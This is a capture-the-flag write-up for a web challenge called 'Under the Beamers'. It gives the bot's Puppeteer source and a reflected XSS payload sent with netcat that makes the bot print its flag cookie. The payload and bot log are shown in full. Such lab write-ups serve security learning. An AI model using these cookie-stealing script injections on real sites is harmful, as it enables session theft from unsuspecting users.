# Under the Beamers

```
Clobbered or not clobbered, that's the question :)

See here: http://65.109.209.215:5000, the bot port is 4000!

Please download the attachment

Thanks to kevin-mizu as author! 😊
```

The attachment contains two parts, the first is a web server that renders html. The second is a bot that scrapes the web server with flag stored in cookie:

```js
// Force puppeteer to store everything to /tmp/
process.env.HOME = "/tmp";

const { delay, handleTargetCreated, handleTargetDestroyed, logMainInfo, logMainError } = require("./utils");
const puppeteer = require("puppeteer");

// Banner
const tips = ["Every console.log usage on the bot will be sent back to you :)", "There is a small race window (~10ms) when a new tab is opened where console.log won't return output :("];
console.log(`==========\nTips: ${tips[Math.floor(Math.random() * tips.length)]}\n==========`);

// Spawn the bot and navigate to the user provided link.
async function goto(html) {
	logMainInfo("Starting the browser...");
	const browser = await puppeteer.launch({
		headless: "new",
		ignoreHTTPSErrors: true,
		args: [
			"--no-sandbox",
			"--disable-gpu",
			"--disable-jit",
			"--disable-wasm",
			"--disable-dev-shm-usage",
		],
		executablePath: "/usr/bin/chromium-browser"
	});

	// Hook tabs events
	browser.on("targetcreated", handleTargetCreated.bind(browser));
	browser.on("targetdestroyed", handleTargetDestroyed.bind(browser));

	/* ** CHALLENGE LOGIC ** */
	const [page] = await browser.pages(); // Reuse the page created by the browser.
	await handleTargetCreated(page.target()); // Since it was created before the event listener was set, we need to hook it up manually.
	await page.setDefaultNavigationTimeout(5000);

	logMainInfo("Going to the app...");
	await browser.setCookie({
		name: "flag",
		value: process.env.FLAG,
		domain: "under-the-beamers-app.internal:5000",
		path: "/",
		httpOnly: false
	});

	logMainInfo("Going to the user provided link...");
	try { await page.goto(`http://under-the-beamers-app.internal:5000/?html=${encodeURIComponent(html)}`) } catch {}
	await delay(2000);

	logMainInfo("Leaving o/");
	await browser.close();
	return;
}

// Handle TCP data
process.stdin.on("data", (data) => {
	const html = data.toString().trim();

	if (!html || html.length > 500) {
		logMainError("You provided an invalid HTML. It should be a non empty string with a length of less than 500 characters.");
		process.exit(1);
	}

	goto(html)
	.then(() => process.exit(0))
	.catch((error) => {
		if (process.env.ENVIRONMENT === "development") {
			console.error(error);
		}
		process.exit(1);
	});
});
```

Inspired by <https://sec-consult.com/vulnerability-lab/advisory/reflected-cross-site-scripting-xss-in-codebeamer-alm-solution-by-ptc/>, we can inject arbitrary script into the rendered HTML:

```
<html><script>alert("abc");</script></html>
```

Visit <http://65.109.209.215:5000/> and write the html above in the text area, and you will see the popup.

Then, we ask the bot to print out the cookie for us:

```shell
$ echo '<html><script>console.log(document.cookie);</script></html>' | nc 65.109.209.215 4000
==========
Tips: Every console.log usage on the bot will be sent back to you :)
==========

Starting the browser...
[T1]> New tab created!
[T1]> navigating        | about:blank

Going to the app...

Going to the user provided link...
[T1]> navigating        | http://under-the-beamers-app.internal:5000/?html=%3Chtml%3E%3Cscript%3Econsole.log(document.cookie)%3B%3C%2Fscript%3E%3C%2Fhtml%3E
[T1]> console.log       | flag=ASIS{cfa4807db22fc60758d32ed0950a40e397c8f9c6a11ae89e8235d034f37f3987}
[T1]> console.error     | Failed to load resource: the server responded with a status of 404 (NOT FOUND)
[T1]> console.log       | Initializing Beamer. [Update and engage users effortlessly - https://getbeamer.com]
[T1]> console.error     | Failed to load resource: the server responded with a status of 404 (NOT FOUND)
```

Flag: `ASIS{cfa4807db22fc60758d32ed0950a40e397c8f9c6a11ae89e8235d034f37f3987}`.
